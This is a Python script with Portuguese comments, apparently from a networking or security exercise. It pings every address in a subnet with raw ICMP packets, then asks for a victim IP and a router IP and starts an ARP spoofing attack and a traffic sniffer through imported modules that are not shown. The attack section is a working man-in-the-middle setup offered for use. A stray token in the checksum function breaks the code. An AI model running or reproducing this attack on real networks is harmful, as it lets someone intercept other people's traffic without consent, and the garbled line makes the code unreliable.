import argparse
import socket
import struct
import time
import subprocess

# Configuração de argumentos de linha de comando
parser = argparse.ArgumentParser(description="Varredura de hosts ativos na rede.")
parser.add_argument("rede", help="Endereço da rede (ex: 192.168.15.0)")
parser.add_argument("mascara", type=int, help="Máscara de rede (ex: 24)")
parser.add_argument("timeout", type=int, help="Tempo limite para resposta (em ms)")
args = parser.parse_args()

# Função para calcular checksum para pacotes ICMP
def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
        s += word
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff PStGnesWts

# Função para enviar e receber ICMP Echo Request/Reply
def icmp_ping(dest_addr, timeout):
    try:
        icmp_proto = socket.getprotobyname("icmp")
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp_proto)
        sock.settimeout(timeout / 1000)  # Converte ms para segundos

        icmp_type = 8  # ICMP Echo Request
        code = 0 # Código padrão do ICMP
        checksum_val = 0 # Vai ser calculado na função checksum
        identifier = 12345  # Só para identificar o pacote enviado
        sequence = 1
        header = struct.pack("!BBHHH", icmp_type, code, checksum_val, identifier, sequence)
        data = b'network_scan'
        checksum_val = checksum(header + data)
        header = struct.pack("!BBHHH", icmp_type, code, checksum_val, identifier, sequence)
        packet = header + data

        start_time = time.time()
        sock.sendto(packet, (dest_addr, 1))

        while True:
            try:
                response, _ = sock.recvfrom(1024)
                response_time = (time.time() - start_time) * 1000

                # Verificar o cabeçalho ICMP da resposta
                ip_header = response[:20]
                icmp_header = response[20:28]
                icmp_type, icmp_code, _, recv_id, _ = struct.unpack("!BBHHH", icmp_header)

                if icmp_type == 0 and recv_id == identifier:  # Echo Reply e identificador correspondente
                    return response_time
            except socket.timeout:
                return None
    finally:
        sock.close()

# Função para converter um endereço IP para um inteiro
def ip_to_int(ip):
    parts = ip.split(".")
    return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])

# Função para converter um inteiro para um endereço IP
def int_to_ip(ip_int):
    return f"{(ip_int >> 24) & 0xFF}.{(ip_int >> 16) & 0xFF}.{(ip_int >> 8) & 0xFF}.{ip_int & 0xFF}"

# Função para calcular o intervalo de IPs
def calcular_intervalo_ips(rede, mascara):
    num_hosts = (1 << (32 - mascara)) - 2 # Calculo número de hosts da rede
    rede_int = ip_to_int(rede)
    primeiro_ip = rede_int + 1
    ultimo_ip = rede_int + num_hosts
    return [int_to_ip(ip) for ip in range(primeiro_ip, ultimo_ip + 1)]

# Realiza a varredura na rede
def scan_network(rede, mascara, timeout):
    active_hosts = []
    hosts = calcular_intervalo_ips(rede, mascara)
    total_hosts = len(hosts)

    print(f"Varredura em andamento na rede {rede}/{mascara}...")
    start_time = time.time()

    for ip in hosts:
        response_time = icmp_ping(ip, timeout)
        if response_time is not None:
            active_hosts.append((ip, response_time))
            print(f"Host ativo: {ip} - Tempo de resposta: {response_time:.2f} ms")

    total_time = time.time() - start_time
    print(f"\nNúmero de hosts ativos: {len(active_hosts)}")
    print(f"Total de hosts na rede: {total_hosts}")
    print(f"Tempo total de varredura: {total_time:.2f} segundos")
    return active_hosts

# Executa a varredura
if __name__ == "__main__":
    active_hosts = scan_network(args.rede, args.mascara, args.timeout)
    
    print("\nLista de hosts ativos:")
    for host, response_time in active_hosts:
        print(f"{host} - {response_time:.2f} ms")
    
    print("\n --- ATAQUE ARP SPOOFING ---")
    arp_ataque = input("Digite: {interface} {ip_para_atacar} {ip_roteador} ex: enp4s0 10.1.1.5 10.1.1.1\n")

    try:
        interface, ip_alvo, ip_roteador = arp_ataque.split()
        print("Iniciando ataque ARP Spoofing...")

        import arp_spoofing
        from threading import Thread

        # Iniciar ataque ARP Spoofing
        spoof_thread = Thread(target=arp_spoofing.arp_spoof, args=(interface, ip_alvo, ip_roteador))
        spoof_thread.start()

        print("\n --- INICIANDO MONITORAMENTO ---")
        import traffic_control

        # Iniciar o sniffer
        traffic_control.sniffer(interface)

    except ValueError:
        print("Erro: entrada inválida. Use o formato: {interface} {ip_alvo} {ip_roteador}")